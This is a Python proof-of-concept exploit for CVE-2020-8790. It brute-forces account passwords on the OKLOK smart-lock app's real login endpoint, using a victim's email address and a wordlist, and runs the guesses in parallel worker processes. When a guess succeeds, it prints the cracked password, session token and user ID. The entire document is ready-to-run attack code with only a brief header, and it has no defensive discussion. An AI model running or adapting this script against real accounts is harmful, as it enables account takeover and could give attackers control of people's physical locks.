#!/usr/bin/env python3

#PoC to demonstrate CVE-2020-8790 
#OKLOK mobile app brute force authentication

import requests
import json
import sys
import itertools
import datetime
import multiprocessing
from functools import partial


#brute force account password using a wordlist 
def login_victim(password, victim_email_address):
		
	url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'

	headers = {'Host': 'app.oklok.com.cn',
	'Content-Type': 'application/json',
	'Connection': 'keep-alive',
	'Accept': '*/*',
	'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
	'Accept-Language': 'en-US;q=1',
	'Content-Length': '70',
	'Accept-Encoding': 'gzip, deflate, br'}

	body = {"code":password,"account":victim_email_address,"type":"0"}
	response = requests.post(url, data=json.dumps(body), headers=headers)
	json_resp = response.json()
	status = json_resp['status']
	if status == '2000':
		print(f'[*] Password discovered!\n')
		print('=============================================================')
		print('LOGIN DETAILS:')
		print('=============================================================')
		print('password: ' + password)
		result = json_resp['result']
		token = result['token']
		userId = result['userId']
		print('token: ' + str(token))
		print('userId: ' + str(userId))
		print('-------------------------------------------------------------\n')

		end_time = datetime.datetime.now()
		total_time = end_time - start_time
			
		print('Total Execution Time: ' + str(total_time))
		print('-------------------------------------------------------------\n')

		return password, token, userId


#main 
if __name__ == '__main__':

	start_time = datetime.datetime.now()  

	if len(sys.argv) is not 3:
		sys.exit('Usage: python3 ownklok_bf_crack.py <victim_email_address> <wordlist_filename>')
	else:
		victim_email_address = sys.argv[1]
		lv = partial(login_victim, victim_email_address=victim_email_address)
		wordlist_filename = sys.argv[2]

	with open(wordlist_filename, "r") as wordlist:
		passwords = wordlist.read().split("\n")

	print('\n-------------------------------------------------------------')
	print('[*] Attempting to log in...')

	
	num_workers = multiprocessing.cpu_count()
	pool = multiprocessing.Pool(num_workers)
	for i in pool.imap_unordered(lv, passwords, chunksize=100):
		result = i
		if result:
			pool.terminate()
			pool.join()
			sys.exit()


	pool.close()
	pool.join()
